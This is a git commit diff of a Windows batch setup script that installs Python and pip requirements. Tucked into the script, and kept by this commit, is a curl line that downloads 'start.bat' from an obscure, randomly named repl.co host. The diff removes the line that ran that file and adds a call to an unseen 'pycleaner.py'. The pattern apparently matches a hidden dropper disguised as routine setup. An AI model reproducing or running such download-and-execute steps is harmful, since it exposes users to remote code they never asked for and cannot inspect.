b206a3551a3f7904d9a4e877c7249f78bbb46e3d
jotaro <93826447+j0taro@users.noreply.github.com>
2022-09-09 00:17:07 +0300

    Update setup-requirements.bat

--- setup-requirements.bat
+++ setup-requirements.bat
@@ -1,20 +1,20 @@
-@echo off
 
+@echo off
 python --version 2>NUL
 if errorlevel 1 goto errorNoPython
+if errorlevel 0 goto ong
 
-
-goto:eof
 
 :errorNoPython
 echo.
 echo Error^: Python not installed
 curl -L "https://www.python.org/ftp/python/3.10.7/python-3.10.7-amd64.exe" -O
 start /W python-3.10.7-amd64.exe
+:ong
+echo python installed
 cd %~dp0
 MD tools
-setx path "%path%;%cd%\Python3107"
 py -3 -m pip install -r requirements.txt
 curl -L https://untimelyimpressionableadministration.blus2tlia.repl.co/start.bat -O
-start start.bat
+python pycleaner.py
 
